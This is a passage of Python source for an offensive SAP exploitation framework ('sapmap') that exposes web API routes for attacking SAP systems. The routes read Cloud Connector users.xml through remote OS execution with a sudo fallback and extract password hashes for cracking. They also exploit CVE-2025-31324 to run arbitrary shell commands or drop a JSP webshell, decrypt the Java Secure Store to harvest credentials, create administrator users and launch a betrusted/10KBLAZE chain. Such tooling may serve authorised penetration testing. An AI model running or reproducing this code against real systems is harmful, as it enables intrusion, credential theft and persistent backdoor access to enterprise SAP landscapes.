                      f"no OS-exec (gw={n.gw_vulnerable}, "
                      f"cve31324={n.cve_2025_31324_vulnerable}, "
                      f"created_users={bool(n.created_users)})")
                continue
            print(f"[*] SCC {host}: Path 1 — trying OS-exec via {n.sid}")
            try:
                from sapmap_exploit import run_os_command
                # SAPXPG splits PARAMS on spaces at the OS level — the args
                # never reach a shell, so /bin/sh -c "..." always breaks.
                # Call ls and cat directly with a plain path argument.
                scc_roots = [
                    "/opt/sap/scc",
                    "/usr/local/scc",
                    "/opt/sapscc",
                    "/opt/cloud-connector",
                    "/opt/SAP/cloud-connector",
                ]
                # For each candidate path: ls tells us existence; cat reads.
                # ls prints just the path on success, or an error containing
                # the path on failure — use startswith to avoid false positives.
                # Permission denied on cat means SAPXPG subprocess lost the
                # scc supplementary group; fall back to sudo cat.
                fpath = None
                for root in scc_roots:
                    candidate = f"{root}/config/users.xml"
                    r_ls = run_os_command(n, "ls", candidate)
                    ls_out = "\n".join(r_ls.get("output") or []).strip()
                    ls_ok = ls_out.startswith(candidate) and \
                            "Permission denied" not in ls_out and \
                            "No such file" not in ls_out
                    print(f"[*] SCC {host}: ls {candidate} → "
                          f"ok={ls_ok} out={ls_out[:60]!r}")
                    if ls_ok:
                        fpath = candidate
                        break
                    # ls permission denied means dir exists but SAPXPG lacks
                    # group access — still try cat (different code path)
                    if "Permission denied" in ls_out:
                        print(f"[*] SCC {host}: ls permission denied on "
                              f"{candidate} — will try cat anyway")
                        fpath = candidate
                        break
                if not fpath:
                    print(f"[-] SCC {host}: users.xml not found via "
                          f"{n.sid} (checked {len(scc_roots)} paths)")
                    continue

                def _try_cat(cmd, arg):
                    r = run_os_command(n, cmd, arg)
                    return "\n".join(r.get("output") or [])

                content = _try_cat("cat", fpath)
                print(f"[*] SCC {host}: cat output ({len(content)} chars): "
                      f"{content[:80]!r}")
                if "Permission denied" in content:
                    # SAPXPG subprocess dropped scc supplementary group.
                    # Try sudo cat — works when s4hadm has passwordless sudo.
                    print(f"[*] SCC {host}: cat permission denied — "
                          f"trying sudo cat")
                    content = _try_cat("sudo", f"cat {fpath}")
                    print(f"[*] SCC {host}: sudo cat ({len(content)} chars): "
                          f"{content[:80]!r}")
                if content.strip().startswith("<"):
                    xml_bytes = content.encode("utf-8", errors="replace")
                    xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
                    print(f"[+] SCC {host}: users.xml read via {n.sid} "
                          f"({len(xml_bytes)} bytes)")
                    break
                else:
                    print(f"[-] SCC {host}: could not read {fpath} — "
                          f"both cat and sudo cat failed")
            except Exception as e:
                print(f"[-] SCC {host}: OS-exec Path 1 error: {e}")

        # --- Path 2: backup zip on disk ----------------------------------
        if not xml_bytes:
            zip_path = sn.keystore_loot_path or ""
            if zip_path:
                print(f"[*] SCC {host}: Path 2 — checking backup zip "
                      f"{zip_path}")
                try:
                    import zipfile as _zf
                    zf = _zf.ZipFile(zip_path)
                    members = zf.namelist()
                    if "config/users.xml" in members:
                        raw = zf.read("config/users.xml")
                        print(f"[*] SCC {host}: users.xml in zip — "
                              f"{len(raw)} bytes, first byte={raw[:1]!r}")
                        if raw[:1] in (b"<", b"\xef"):
                            xml_bytes = raw
                            xml_source = f"backup zip ({zip_path})"
                            print(f"[+] SCC {host}: users.xml from zip "
                                  f"({len(xml_bytes)} bytes)")
                        else:
                            print(f"[-] SCC {host}: users.xml in zip is "
                                  f"binary/encrypted — backup password "
                                  f"required to decrypt (SCC encrypts it "
                                  f"inside the zip)")
                    else:
                        print(f"[-] SCC {host}: config/users.xml not in "
                              f"zip (members: {members[:8]})")
                except Exception as e:
                    print(f"[-] SCC {host}: Path 2 zip error: {e}")
            else:
                print(f"[*] SCC {host}: Path 2 — no backup zip on record "
                      f"(run Extract Keystore first)")

        # --- Path 3: REST API user listing (no hashes) -------------------
        if not xml_bytes:
            print(f"[*] SCC {host}: Path 3 — REST API fallback")
            creds = sn.credentials[0] if sn.credentials else None
            if creds:
                try:
                    from sapmap_scc_admin import login, logout, _basic_headers
                    import urllib.request as _urlreq
                    u = getattr(creds, "username", None) or (
                        creds.get("username","") if isinstance(creds,dict) else "")
                    p = getattr(creds, "password", None) or (
                        creds.get("password","") if isinstance(creds,dict) else "")
                    print(f"[*] SCC {host}: REST login as {u!r}")
                    sess = login(host, u, p, port=sn.admin_ui_port or 8443)
                    if sess and sess.authenticated:
                        url = f"{sess.base_url}/api/v1/users"
                        req = _urlreq.Request(url, headers=_basic_headers(sess))
                        with sess.opener.open(req, timeout=8) as resp:
                            body = resp.read().decode("utf-8", errors="replace")
                        logout(sess)
                        print(f"[*] SCC {host}: REST /api/v1/users "
                              f"({len(body)} bytes): {body[:100]!r}")
                        import json as _j2
                        rest_users = _j2.loads(body) if body.startswith("[") else []
                        if rest_users:
                            sapmap_findings.emit_finding(
                                "INFO", host,
                                f"SCC users enumerated via REST (no hashes): "
                                f"{[u.get('name') for u in rest_users]}",
                                ref="scc.users.rest_listed",
                                meta={"users": rest_users})
                            return json.dumps({
                                "ok": True,
                                "source": "REST API (user list only — no hashes; filesystem access needed)",
                                "users": rest_users,
                                "hashes": [],
                                "hashcat_commands": [],
                            })
                    else:
                        print(f"[-] SCC {host}: REST login failed")
                except Exception as e:
                    print(f"[-] SCC {host}: Path 3 REST error: {e}")
            else:
                print(f"[-] SCC {host}: Path 3 — no stored credentials "
                      f"(use Set Credentials on this SCC node)")
            diag = (f"users.xml not reachable on SCC {host}. "
                    f"scc_addrs={scc_addrs}. "
                    f"Tried: Path1=OS-exec via co-located SAP node "
                    f"(gw_vulnerable/cve31324/created_users required); "
                    f"Path2=backup zip ({sn.keystore_loot_path or 'none'}); "
                    f"Path3=REST API ({'creds present' if creds else 'no creds'}). "
                    f"Check terminal for details.")
            print(f"[-] SCC {host}: all paths failed — {diag}")
            return json.dumps({"ok": False, "error": diag})

        # --- Parse XML ---------------------------------------------------
        print(f"[*] SCC {host}: xml_bytes ({len(xml_bytes)}B) first 300: "
              f"{xml_bytes[:300]!r}")
        from sapmap_scc_keystore import parse_user_hashes_from_xml
        result = parse_user_hashes_from_xml(xml_bytes)
        if not result.get("ok"):
            print(f"[-] SCC {host}: XML parse failed: {result.get('error')}")
            return json.dumps(result)
        users = result["users"]
        hashcat_cmds = result["hashcat_commands"]
        for u in users:
            if u.get("hash_hex"):
                sapmap_findings.emit_finding(
                    "HIGH", host,
                    f"SCC password hash recovered for '{u['username']}' "
                    f"({u.get('algorithm','?')}, "
                    f"roles={u.get('roles','?')}) — "
                    f"hashcat -m {u.get('hashcat_mode',0)} hash:salt, "
                    f"or paste hash into https://crackstation.net for "
                    f"instant rainbow-table lookup.",
                    ref="scc.users.hash_recovered",
                    meta={"username": u["username"],
                          "algorithm": u.get("algorithm"),
                          "hashcat_mode": u.get("hashcat_mode"),
                          "roles": u.get("roles")})
            else:
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC user '{u['username']}' found in users.xml "
                    f"(no hash parsed).",
                    ref="scc.users.no_hash",
                    meta={"username": u["username"]})
        return json.dumps({
            "ok": True,
            "source": xml_source,
            "users": users,
            "hashcat_commands": hashcat_cmds,
        })

    # -- Node operations --
    @app.route("/api/node/<sid>/credentials", method="POST")
    def node_credentials(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        creds = Credentials(
            username=data.get("username", ""),
            password=data.get("password", ""),
            client=data.get("client", "100"),
            instance_nr=data.get("instance_nr", "00"),
        )

        if data.get("test_only"):
            ok = sapmap_rfc.test_connection(node, creds)
            return json.dumps({"success": ok, "message": "OK" if ok else "Failed"})

        # Test and save credentials
        print(f"[*] Testing credentials for {sid}: user={creds.username}, "
              f"client={creds.client}, instance={creds.instance_nr}")
        creds.verified = sapmap_rfc.test_connection(node, creds)
        node.credentials.append(creds)
        if creds.verified:
            print(f"[+] Credentials saved and verified for {sid}")
        else:
            print(f"[!] Credentials saved for {sid} but could NOT verify — "
                  f"check the error above. User creation will likely fail.")
        return json.dumps({"success": True, "verified": creds.verified})

    @app.route("/api/node/<sid>/harvest_scc", method="POST")
    def node_harvest_scc(sid):
        """Run harvest_scc_from_pwned_node in a background thread."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            result = sapmap_exploit.harvest_scc_from_pwned_node(node, api.state)
            if result.get("error"):
                print(f"[-] {sid}: harvest_scc error: {result['error']}")

        _bg(f"{sid}:harvest_scc", f"{sid}: Harvest SCC (post-RCE)", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/deep_scan", method="POST")
    def node_deep_scan(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_scanner.deep_scan_single(node)
        _bg(f"{sid}:deep_scan", "Deep Scan", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/set_type", method="POST")
    def node_set_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_type = data.get("system_type", "").strip()
        if new_type:
            node.system_type = new_type
            print(f"[*] System type for {sid} set to: {new_type}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_db_type", method="POST")
    def node_set_db_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_db = data.get("db_type", "").strip()
        if new_db:
            node.db_type = new_db
            print(f"[*] DB type for {sid} set to: {new_db}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_os_type", method="POST")
    def node_set_os_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_os = data.get("os_type", "").strip()
        if new_os:
            node.os_type = new_os
            print(f"[*] OS type for {sid} set to: {new_os}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_instance_nr", method="POST")
    def node_set_instance_nr(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_nr = (data.get("instance_nr") or "").strip()
        if not (len(new_nr) == 2 and new_nr.isdigit()):
            return json.dumps({"error": "instance_nr must be two digits, e.g. 00"})
        # Conventional SAP per-instance ports — without these on the
        # InstanceInfo, GW-gated actions (RFC System Info, Check GW,
        # Create User via GW) stay greyed out because the front-end
        # checks for a 33NN port flagged as gateway.  Same flavour as
        # the RFC-discovery path that creates new nodes.
        canonical_ports = {
            int(f"32{new_nr}"): "dispatcher",
            int(f"33{new_nr}"): "gateway",
            int(f"36{new_nr}"): "ms",
            int(f"80{new_nr}"): "icm-http",
        }
        if node.instances:
            inst = node.instances[0]
            inst.instance_nr = new_nr
            for p, svc in canonical_ports.items():
                inst.ports.setdefault(p, svc)
        else:
            node.instances.append(InstanceInfo(
                instance_nr=new_nr,
                ip=node.ip or node.hostname or "",
                ports=dict(canonical_ports)))
        print(f"[*] Instance number for {sid} set to: {new_nr}")
        return json.dumps({"status": "ok", "instance_nr": new_nr})

    @app.route("/api/node/<sid>/set_saprouter", method="POST")
    def node_set_saprouter(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_router = data.get("saprouter", "").strip()
        node.saprouter = new_router
        if new_router:
            print(f"[*] SAProuter for {sid} set to: {new_router}")
        else:
            print(f"[*] SAProuter for {sid} removed")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_telnet_override", method="POST")
    def node_set_telnet_override(sid):
        """Set (or clear) a custom host:port for the admin telnet console.

        Use case: the target binds 5NN08 to 127.0.0.1 and the operator
        has an SSH tunnel — setting override to e.g. '127.0.0.1:50008'
        makes the telnet deploy path connect through the tunnel.
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        spec = (data.get("telnet_override") or "").strip()
        node.telnet_override = spec
        if spec:
            print(f"[*] {sid}: telnet override set to {spec!r}")
        else:
            print(f"[*] {sid}: telnet override cleared")
        return json.dumps({"status": "ok",
                            "telnet_override": node.telnet_override})

    @app.route("/api/node/<sid>/router_scan", method="POST")
    def node_router_scan(sid):
        """Scan internal hosts through a SAProuter node.

        POST body (JSON):
            targets      str   IP range/list to scan, e.g. "192.168.2.0/24"
                               Omit or set to "" to auto-fill from router info.
            auto_targets bool  If true, extract targets from node.saprouter_info
                               (the ROUTER_ADM info leak result) and merge with
                               any manually supplied targets.
            inst_from    int   Start of instance number range (default 0)
            inst_to      int   End of instance number range (default 10)
            mode         str   "sap" (default) or "full" (adds HANA + JAVA ports)
            concurrency  int   Simultaneous probes per host (default 10)
            timeout      float Per-probe socket timeout in seconds (default 5)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        # Build the SAProuter prefix from the node's IP (if it IS the router)
        # or from node.saprouter (if it routes THROUGH a router to this node).
        # A SAProuter node has system_type="SAPROUTER" or port 3299 open.
        router_port = 3299
        for inst in node.instances:
            for port, svc in inst.ports.items():
                if svc == "saprouter" or port == 3299:
                    router_port = port
                    break

        router_ip = node.ip or node.hostname
        if node.saprouter:
            # This node is itself reached via a SAProuter — chain through it
            saprouter_prefix = node.saprouter
        else:
            # This node IS the SAProuter
            saprouter_prefix = f"/H/{router_ip}/S/{router_port}"

        # Collect targets
        target_ips = []
        targets_str = (data.get("targets") or "").strip()
        if targets_str:
            target_ips = sapmap_scanner.parse_targets(targets_str)

        auto_targets = data.get("auto_targets", not bool(targets_str))
        if auto_targets and node.saprouter_info:
            from sapmap_scanner import extract_targets_from_router_info
            router_targets = extract_targets_from_router_info(node.saprouter_info)
            if router_targets:
                print(f"[*] {sid}: Auto-extracted {len(router_targets)} target(s) "
                      f"from router info: {router_targets[:5]}"
                      f"{'...' if len(router_targets) > 5 else ''}")
                # Merge, deduplicate, preserve order
                existing = set(target_ips)
                for t in router_targets:
                    if t not in existing:
                        target_ips.append(t)
                        existing.add(t)

        if not target_ips:
            return json.dumps({"error": "No targets specified and no router info available. "
                                        "Supply a target range or run Router Info first."})

        inst_from   = int(data.get("inst_from", 0))
        inst_to     = int(data.get("inst_to", 10))
        mode        = data.get("mode", "sap")
        concurrency = int(data.get("concurrency", 10))
        timeout     = float(data.get("timeout", 5.0))

        print(f"[*] {sid}: Starting SAProuter internal scan")
        print(f"[*]   Router prefix: {saprouter_prefix}")
        print(f"[*]   Targets: {len(target_ips)}, instances {inst_from:02d}-{inst_to:02d}, "
              f"mode={mode}")

        def _run():
            _task_start(f"{sid}:router_scan", f"Router Scan via {sid}")
            try:
                nodes = sapmap_scanner.scan_network_via_saprouter(
                    saprouter_prefix=saprouter_prefix,
                    targets=target_ips,
                    instance_range=(inst_from, inst_to),
                    timeout=timeout,
                    concurrency=concurrency,
                    mode=mode,
                    cancel_event=api.cancel_event,
                    node_callback=lambda n: api.state.add_node(n),
                    verbose=True,
                )
                # Add any nodes not yet added via callback
                for n in nodes:
                    if n.sid not in api.state.nodes:
                        api.state.add_node(n)
                print(f"[+] {sid}: Router scan complete — "
                      f"{len(nodes)} system(s) discovered")
            except Exception as e:
                print(f"[-] {sid}: Router scan error: {e}")
                import traceback
                traceback.print_exc()
            finally:
                _task_end(f"{sid}:router_scan")

        _bg(f"{sid}:router_scan", f"Router Scan via {sid}", _run)
        return json.dumps({
            "status": "started",
            "saprouter_prefix": saprouter_prefix,
            "targets": len(target_ips),
            "instances": f"{inst_from:02d}-{inst_to:02d}",
            "mode": mode,
        })

    @app.route("/api/node/<sid>/rfc_system_info", method="POST")
    def node_rfc_system_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            # Find gateway port
            gw_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = port
                        break
                if gw_port:
                    break
            if not gw_port:
                print(f"[-] No gateway port found for {node.sid}")
                return
            host = node.ip or node.hostname
            if node.saprouter:
                print(f"[*] {node.sid}: Using SAProuter: {node.saprouter}")
            # Pass known instance numbers so SAPControl queries the right one
            inst_nrs = [inst.instance_nr for inst in node.instances
                        if inst.instance_nr is not None]
            info = sapmap_scanner.enrich_system_info(
                host, gw_port, instance_nrs=inst_nrs,
                sid_hint=node.sid, saprouter=node.saprouter)
            # Update node with retrieved info
            if info.get("sid") and not node.sid.startswith("UNK"):
                pass  # keep existing SID
            elif info.get("sid"):
                node.sid = info["sid"]
            if info.get("hostname"):
                node.hostname = info["hostname"]
            if info.get("os_type"):
                node.os_type = info["os_type"]
            if info.get("db_type"):
                node.db_type = info["db_type"]
            if info.get("kernel"):
                node.kernel = info["kernel"]
            if info.get("sap_release"):
                node.sap_release = info["sap_release"]

            # Set system type from SAPControl ABAP/JAVA detection
            sc_abap = info.get("_is_abap", False)
            sc_java = info.get("_is_java", False)
            if sc_abap or sc_java:
                if sc_abap and sc_java:
                    node.system_type = "ABAP+JAVA"
                elif sc_java:
                    node.system_type = "JAVA"
                else:
                    node.system_type = "ABAP"

            # Database port fingerprinting (if DB not yet known)
            if not node.db_type:
                inst_nrs = node.instance_nrs() or ["00"]
                db_ports = []
                for nr in inst_nrs:
                    n = int(nr)
                    db_ports.append((30000 + n * 100 + 13, "HDB"))   # HANA SystemDB
                    db_ports.append((30000 + n * 100 + 15, "HDB"))   # HANA tenant
                db_ports += [(7210, "ADA"), (1433, "MSS"),
                             (1521, "ORA"), (50000, "DB6")]
                print(f"[*] Scanning database ports on {host}...")
                for port, db_name in db_ports:
                    if sapmap_scanner._scan_port(host, port, timeout=2.0):
                        node.db_type = db_name
                        print(f"[+] Database detected: {db_name} "
                              f"(port {port} open on {host})")
                        break
                if not node.db_type:
                    print(f"[*] No database ports detected on {host}")

        _bg(f"{sid}:rfc_system_info", "RFC System Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_gw", method="POST")
    def node_check_gw(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_exploit.check_gw_vulnerable(node)

        _bg(f"{sid}:check_gw", "Check Gateway", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_ms", method="POST")
    def node_check_ms(sid):
        """Check MS internal port for CVE-2020-6207 (betrusted vulnerability)."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207 / betrusted)...")
            found = sapmap_scanner.check_ms_betrusted(node)
            if not found:
                print(f"[*] {sid}: MS internal port not found/reachable")
            elif node.ms_vulnerable:
                print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE — betrusted attack possible!")
            elif node.ms_acl_protected:
                print(f"[~] {sid}: MS port {node.ms_port} reachable but ACL-protected")

        _bg(f"{sid}:check_ms", "Check MS Betrusted", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_cve_2020_6287", method="POST")
    def node_check_cve_2020_6287(sid):
        """Probe Java ports for CVE-2020-6287 (RECON)."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java / double-stack system"})

        def _run():
            print(f"[*] {sid}: Checking CVE-2020-6287 (RECON / "
                  f"LM Configuration Wizard)...")
            found = sapmap_scanner.check_cve_2020_6287(node)
            if found:
                print(f"[+] {sid}: VULNERABLE — port "
                      f"{node.cve_2020_6287_port} · "
                      f"{node.cve_2020_6287_evidence}")
            elif node.cve_2020_6287_evidence:
                print(f"[*] {sid}: not vulnerable "
                      f"({node.cve_2020_6287_evidence})")
            else:
                print(f"[*] {sid}: no Java HTTP port responded")

        _bg(f"{sid}:check_cve_6287", "Check CVE-2020-6287", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_cve_2025_31324", method="POST")
    def node_check_cve_2025_31324(sid):
        """Probe Java ports for CVE-2025-31324 (metadatauploader unauth RCE).

        Only meaningful for Java / double-stack systems — returns an error
        for pure ABAP nodes rather than silently succeeding.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        sys_type = (node.system_type or "").upper()
        if "JAVA" not in sys_type:
            return json.dumps({"error": "Not a Java / double-stack system — "
                                         "CVE-2025-31324 does not apply"})

        def _run():
            print(f"[*] {sid}: Checking CVE-2025-31324 "
                  f"(VisualComposer metadatauploader)...")
            found = sapmap_scanner.check_cve_2025_31324(node)
            if found:
                print(f"[+] {sid}: VULNERABLE — port "
                      f"{node.cve_2025_31324_port} · {node.cve_2025_31324_evidence}")
            elif node.cve_2025_31324_evidence:
                print(f"[*] {sid}: not vulnerable ({node.cve_2025_31324_evidence})")
            else:
                print(f"[*] {sid}: no Java HTTP port responded")

        _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_java_table", method="POST")
    def node_download_java_table(sid):
        """Run a SELECT against the Java stack's DB via JSP/JDBC."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})
        table  = (data.get("table") or "").strip()
        fields = (data.get("fields") or "*").strip()
        where  = (data.get("where") or "").strip()
        try:
            max_rows = int(data.get("max_rows") or 500)
        except Exception:
            max_rows = 500
        if not table:
            return json.dumps({"error": "table is required"})

        def _run():
            r = sapmap_exploit.download_java_table(
                node, table, fields=fields, where=where, max_rows=max_rows)
            if r.get("success"):
                # Stash for the modal to pick up
                if not hasattr(node, "java_table_dumps"):
                    node.java_table_dumps = []
                node.java_table_dumps.append({
                    "table": table, "columns": r.get("columns", []),
                    "rows": r.get("rows", []),
                    "row_count": r.get("row_count", 0),
                })
                # Persist to states/ as CSV
                import os as _os
                from datetime import datetime as _dt
                states_dir = _os.path.join(_os.path.dirname(__file__), "states")
                _os.makedirs(states_dir, exist_ok=True)
                ts = _dt.now().strftime("%Y%m%d_%H%M%S")
                fpath = _os.path.join(states_dir,
                    f"table_java_{sid}_{table.replace('.','_')}_{ts}.csv")
                import csv as _csv
                with open(fpath, "w", newline="", encoding="utf-8") as fh:
                    w = _csv.writer(fh)
                    w.writerow(r.get("columns", []))
                    for row in r.get("rows", []):
                        w.writerow(row)
                print(f"[+] {sid}: rows written to {fpath}")

        _bg(f"{sid}:download_java_table", "Download Java Table", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/extract_java_hashes", method="POST")
    def node_extract_java_hashes(sid):
        """Extract UME password hashes + J2EE_CONFIGENTRY credential entries."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.extract_java_password_hashes(node)
            if r.get("success"):
                print(f"[+] {sid}: hash extraction summary — "
                      f"{r.get('count', 0)} UME hashes, "
                      f"{r.get('configentry_secret_count', 0)} configentry "
                      f"secrets, file: {r.get('file_path')}")

        _bg(f"{sid}:extract_java_hashes", "Extract Java Hashes", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/impact_assess_java", method="POST")
    def node_impact_assess_java(sid):
        """Run Java business-impact scenarios (PI/PO, NWDI/CTS+, HR/ESS,
        KMC, audit tamper) against a Java/dual-stack node."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.assess_java_impact(node, api.state)
            if r.get("success"):
                hits = len(r.get("results", []))
                print(f"[+] {sid}: Java impact assessment complete — "
                      f"{hits} scenario(s) applicable on this stack "
                      f"({r.get('components', 0)} components inventoried)")
            else:
                print(f"[-] {sid}: Java impact assessment failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:impact_assess_java", "Assess Java Business Impact", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/read_java_destinations", method="POST")
    def node_read_java_destinations(sid):
        """Read all JCo destinations from J2EE_CONFIGENTRY, plot the
        downstream targets on the map, and import their credentials."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.read_java_destinations(node, api.state)
            if r.get("success"):
                print(f"[+] {sid}: read_java_destinations summary: "
                      f"{len(r.get('destinations', []))} destinations, "
                      f"{r['added_nodes']} new nodes plotted, "
                      f"{r['credentials_added']} creds imported, "
                      f"{r['added_edges']} RFC edges drawn")
            else:
                print(f"[-] {sid}: read_java_destinations failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:read_java_destinations", "Read Java JCo Destinations", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/java_secstore", method="POST")
    def node_java_secstore(sid):
        """Extract + decrypt the Java Secure Store; import credentials and
        auto-plot downstream ABAP systems + RFC edges."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java / dual-stack system"})

        def _run():
            r = sapmap_exploit.extract_java_secstore(node, api.state)
            if r.get("success"):
                print(f"[+] {sid}: Java Secure Store extraction summary: "
                      f"{r['entries_count']} entries, "
                      f"{r['credentials_added']} credentials imported, "
                      f"{r['downstream_added']} downstream node(s) added, "
                      f"{r['edges_added']} RFC edge(s) drawn")
                if r.get("credentials_added"):
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"Java Secure Store decrypted — "
                        f"{r['credentials_added']} credential(s) imported, "
                        f"{r['downstream_added']} downstream system(s) added",
                    )
            else:
                print(f"[-] {sid}: Java Secure Store extraction failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:java_secstore", "Extract Java Secure Store", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user_java", method="POST")
    def node_create_user_java(sid):
        """Create a Java stack user via the UME API exposed by a deployed JSP.

        Body: {username, password, group?, method? = "auto"|"cve_31324"|"gw"}
        Responds synchronously with the CreatedUser result (or error).
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        sys_type = (node.system_type or "").upper()
        if "JAVA" not in sys_type:
            return json.dumps({"error": "Not a Java / dual-stack system"})

        username = (data.get("username") or "SAPMAP00").strip()
        password = (data.get("password") or "").strip()
        group    = (data.get("group") or "Administrators").strip()
        method   = (data.get("method") or "auto").strip()

        def _run():
            created = sapmap_exploit.create_user_java(
                node, api.state, username=username, password=password,
                group=group, method=method)
            if created:
                api.state.track_created_user(created)

        _bg(f"{sid}:create_user_java", "Create Java User", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exploit_cve_2025_31324", method="POST")
    def node_exploit_cve_2025_31324(sid):
        """Exploit CVE-2025-31324.  mode: "command" (default) | "dropshell".
        For "command" supply a "command" field (string).  Responds
        synchronously with the execution result."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.cve_2025_31324_vulnerable:
            return json.dumps({"error": "CVE-2025-31324 not confirmed on "
                                         "this node — run Check first"})

        mode = data.get("mode", "command")
        if mode == "dropshell":
            result = sapmap_exploit.drop_cve_2025_31324_shell(node)
            if result.get("success"):
                print(f"[+] {sid}: JSP webshell dropped at {result['shell_url']}")
            else:
                print(f"[-] {sid}: dropshell failed: "
                      f"{result.get('error', '?')}")
            return json.dumps(result)

        # mode == "command"
        cmd = (data.get("command") or "").strip()
        if not cmd:
            return json.dumps({"error": "command is required"})
        # Auto-wrap in shell based on node OS (same pattern as exec_command)
        os_type = (node.os_type or "").lower()
        is_win = any(w in os_type for w in ("windows", "nt", "win"))
        # If OS unknown, assume Windows (SJJ-style SAP Java is commonly Windows);
        # user can override via Set OS Type.
        if not os_type or is_win:
            wrapped = f"cmd.exe /C {cmd}"
        else:
            wrapped = f"/bin/sh -c {cmd!r}"
        result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, wrapped)
        return json.dumps(result)

    @app.route("/api/node/<sid>/betrusted_chain", method="POST")
    def node_betrusted_chain(sid):
        """Full 10KBLAZE chain: betrusted → check GW trust → SAPXPG → create user."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        attacker_ip  = data.get("attacker_ip", "").strip()
        nilist_wait  = float(data.get("nilist_wait", 30.0))
        client       = data.get("client")

        stop_event = threading.Event()
        key = f"{sid}:betrusted_chain"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                created = sapmap_exploit.create_user_betrusted_chain(
                    node, api.state,
